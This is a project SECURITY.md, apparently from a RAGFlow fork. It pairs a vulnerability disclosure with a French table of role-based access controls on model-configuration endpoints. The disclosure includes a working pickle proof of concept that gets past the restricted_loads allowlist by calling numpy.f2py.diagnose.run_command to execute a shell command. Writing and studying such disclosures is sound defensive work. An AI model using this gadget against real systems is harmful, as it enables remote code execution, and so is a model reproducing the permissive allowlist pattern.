# Security Policy

## Supported Versions

Use this section to tell people about which versions of your project are
currently being supported with security updates.

| Version | Supported          |
|---------|--------------------|
| <=0.7.0 | :white_check_mark: |

## Reporting a Vulnerability

### Branch name

main

### Actual behavior

The restricted_loads function at [api/utils/__init__.py#L215](https://github.com/infiniflow/ragflow/blob/main/api/utils/__init__.py#L215) is still vulnerable leading via code execution.
The main reason is that numpy module has a numpy.f2py.diagnose.run_command function directly execute commands, but the restricted_loads function allows users import functions in module numpy.


### Steps to reproduce


**ragflow_patch.py**

```py
import builtins
import io
import pickle

safe_module = {
    'numpy',
    'rag_flow'
}


class RestrictedUnpickler(pickle.Unpickler):
    def find_class(self, module, name):
        import importlib
        if module.split('.')[0] in safe_module:
            _module = importlib.import_module(module)
            return getattr(_module, name)
        # Forbid everything else.
        raise pickle.UnpicklingError("global '%s.%s' is forbidden" %
                                     (module, name))


def restricted_loads(src):
    """Helper function analogous to pickle.loads()."""
    return RestrictedUnpickler(io.BytesIO(src)).load()
```
Then, **PoC.py**
```py
import pickle
from ragflow_patch import restricted_loads
class Exploit:
     def __reduce__(self):
         import numpy.f2py.diagnose
         return numpy.f2py.diagnose.run_command, ('whoami', )

Payload=pickle.dumps(Exploit())
restricted_loads(Payload)
```
**Result**
![image](https://github.com/infiniflow/ragflow/assets/85293841/8e5ed255-2e84-466c-bce4-776f7e4401e8)


### Additional information

#### How to prevent?
Strictly filter the module and name before calling with getattr function.




---

## B2B SaaS — FinOps RBAC (Custom Layer)

Doctrine : **ws_admin gère le compute (modèles), EDITOR/VIEWER gère l'usage (données/conversations).**

### Vecteurs compute verrouillés

| Endpoint | Champ | Mécanisme | Fichier |
|---|---|---|---|
| `POST /user/set_tenant_info` | llm_id, embd_id, asr_id, img2txt_id | `@require_permission(LLM_CONFIGURE)` → 403 | `user_app.py` |
| `POST /chats` | llm_id, rerank_id, llm_setting | Silent drop → fallback workspace default | `chat_api.py` |
| `PUT /chats/{id}` | llm_id | 403 si valeur change | `chat_api.py` |
| `PUT /chats/{id}` | rerank_id | 403 si valeur change | `chat_api.py` |
| `PATCH /chats/{id}` | llm_id | 403 si valeur change | `chat_api.py` |
| `PATCH /chats/{id}` | rerank_id | 403 si valeur change | `chat_api.py` |
| `POST /datasets` | embedding_model | Silent drop → fallback workspace default | `dataset_api.py` |
| `PUT /datasets/{id}` | embedding_model | 403 si valeur change | `dataset_api.py` |
| `POST /memories` | llm_id, embd_id | Replace par défaut workspace + log WARN | `memory_api.py` |
| `PUT /memories/{id}` | llm_id, embd_id | 403 immédiat | `memory_api.py` |
| `POST /kb/check_embedding` | embd_id | `@require_permission(LLM_CONFIGURE)` → 403 | `kb_app.py` |
| `POST /llm/set_api_key` | — | `@require_permission(LLM_CONFIGURE)` → 403 | `llm_app.py` |
| `POST /llm/add_llm` | — | `@require_permission(LLM_CONFIGURE)` → 403 | `llm_app.py` |
| `POST /llm/delete_llm` | — | `@require_permission(LLM_CONFIGURE)` → 403 | `llm_app.py` |
| `POST /llm/enable_llm` | — | `@require_permission(LLM_CONFIGURE)` → 403 | `llm_app.py` |
| Connecteurs datasources | — | `@require_permission(DATASOURCE_CONFIGURE)` | `connector_app.py` |
| Serveurs MCP | — | `@require_permission(MCP_CONFIGURE)` | `mcp_server_app.py` |

### Frontend masqué (ws_member ne voit pas les contrôles)

| Composant | Condition | Fichier |
|---|---|---|
| Sélecteur modèle LLM (chat settings) | `isWsAdmin` | `chat-settings.tsx` |
| Sélecteur modèle LLM (multi-chat A/B) | `isWsAdmin` | `next-multiple-chat-box.tsx` |
| Sélecteur embedding model (dataset settings) | `isWsAdmin` | `general-form.tsx` |
| Page configuration modèles utilisateur | Remplacée par message admin | `setting-model/index.tsx` |

### Rôles

| Rôle | Permissions compute |
|---|---|
| `ws_admin` | Toutes — peut configurer tous les modèles |
| `editor` | Aucune — fallback silencieux ou 403 |
| `viewer` | Aucune |

Voir `api/apps/extensions/rbac.py` pour la matrice complète `ROLE_PERMISSIONS`.